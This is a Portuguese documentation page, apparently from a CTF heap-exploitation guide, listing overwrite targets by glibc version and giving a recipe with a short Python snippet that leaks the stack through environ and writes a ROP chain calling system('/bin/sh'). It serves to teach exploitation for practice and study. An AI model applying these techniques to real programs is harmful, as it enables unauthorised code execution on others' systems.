---
title: "Alvos: o que sobrescrever"
sidebar_position: 5
---

Uma escrita arbitrária ([Tcache Poisoning](./tcache-poisoning.md), [Fastbin dup](./fastbin.md), [Unlink](./unlink.md)) só vira shell se atingir algo que o programa usa para decidir o fluxo. O alvo depende da versão da glibc. Tabela completa em [Ataques por versão da glibc](../../../pwning/heap/glibc-versions.mdx#o-que-sobrescrever).

| glibc | Alvo | O que escrever |
|-------|------|----------------|
| < 2.34 | `__free_hook` | `system` → depois `free(chunk_com_"/bin/sh")` chama `system("/bin/sh")` |
| < 2.34 | `__malloc_hook` | `one_gadget` → depois `malloc()`. Também dispara com `printf("%p")` (aloca internamente) e com `free` de `realloc_hook` |
| qualquer, `Partial RELRO`, `No PIE` | GOT (`free@got`, `puts@got`, `atoi@got`) | `system` / `win`. `atoi` é ótimo: `atoi(input)` vira `system(input)` |
| qualquer | ponteiro de função/struct do próprio programa na heap | endereço de `win`/`system` |
| ≥ 2.34 | `environ` (libc) → **leia** para vazar a stack | depois aloque em `return address` da função atual e escreva uma ROP chain (`pop rdi; ret`, `/bin/sh`, `system`, da libc). A `main` costuma terminar com `exit`, então mire no `ret` de uma função chamada pelo menu |
| ≥ 2.34 | `stdout` (`_IO_2_1_stdout_`) | FSOP: leak via `_IO_write_base` ou execução via vtable (`_IO_wfile_jumps`, House of Apple). Avançado |
| < 2.39 | GOT da libc | Funções como `puts` chamam `strlen` pela GOT da própria libc (Partial RELRO até a 2.38) |

Offsets: `libc.sym['__free_hook']`, `libc.sym['environ']`, `libc.sym['_IO_2_1_stdout_']`.

## Receita: `environ` → ROP (glibc ≥ 2.34)

1. Leak de heap e libc ([Leaks](./leaks.md)).
2. Tcache poisoning em `libc.sym['environ']` (alinhado em 16? `environ` costuma ser, confira; senão mire em `environ - 0x10` e leia 24 bytes) e **leia**: o valor é um endereço da stack.
3. A distância entre o valor de `environ` e o return address da função é fixa para o binário: meça uma vez no GDB (`p &environ` para o endereço, `x/gx &environ` para o valor, e o endereço do return address com `info frame` ou `telescope $rsp` dentro da função). `ret_addr = stack_leak - distancia`.
4. Tcache poisoning em `ret_addr & ~0xf` e escreva a chain (com padding até o `ret_addr`): `ret; pop rdi; ret; /bin/sh; system`.
5. Faça a função retornar (sair do menu, ou terminar a ação).

```py
poison(libc.sym['environ'] - 0x10)          # alinhado
stack = u64(show(idx)[0x10:0x18])
ret_addr = stack - 0x120                    # medido no GDB
chain = p64(rop_ret) + p64(pop_rdi) + p64(bin_sh) + p64(libc.sym['system'])
poison(ret_addr & ~0xf)
edit(idx, b'A' * (ret_addr & 0xf) + chain)
```

Sem o alinhamento (`environ - 0x10`), o `malloc` aborta com `unaligned tcache chunk`.
